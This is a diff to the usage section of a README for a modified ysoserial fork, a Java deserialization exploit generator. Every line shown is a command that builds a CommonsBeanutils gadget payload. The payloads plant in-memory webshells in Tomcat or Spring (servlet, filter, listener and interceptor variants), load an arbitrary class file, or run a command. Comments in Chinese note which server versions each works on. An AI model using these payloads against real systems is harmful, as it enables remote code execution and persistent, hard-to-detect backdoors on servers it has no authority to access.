@@ -95,9 +95,11 @@ Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
 ```shell
 java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatCmdEcho"                     # TomcatCmdEcho
 java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatServletMemShellFromJMX"      # TomcatServletMemShellFromJMX
-java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatServletMemShellFromThread"   # TomcatServletMemShellFromThread springboot也成功过
+java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatServletMemShellFromThread"   # TomcatServletMemShellFromThread
 java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatFilterMemShellFromJMX"       # TomcatFilterMemShellFromJMX     适用于tomcat7-9
-java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatFilterMemShellFromThread"    # TomcatFilterMemShellFromThread  适用于tomcat7-9 springboot也成功过
+java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatFilterMemShellFromThread"    # TomcatFilterMemShellFromThread  适用于tomcat7-9
+java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatListenerMemShellFromJMX"     # TomcatListenerMemShellFromJMX
+java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:TomcatListenerMemShellFromThread"  # TomcatListenerMemShellFromThread 好像这个兼容性更强 没有包装类问题
 java -jar ysoserial.jar CommonsBeanutils1NOCC "CLASS:SpringInterceptorMemShell"         # SpringInterceptorMemShell       测试于springboot2.0.9和2.6.5 链接shell需要使用存在的路由
 java -jar ysoserial.jar CommonsBeanutils1NOCC "FILE:E:\Calc.class"                      # ClassLoaderTemplate
 java -jar ysoserial.jar CommonsBeanutils1NOCC "CMD:calc"                                # CommandTemplate
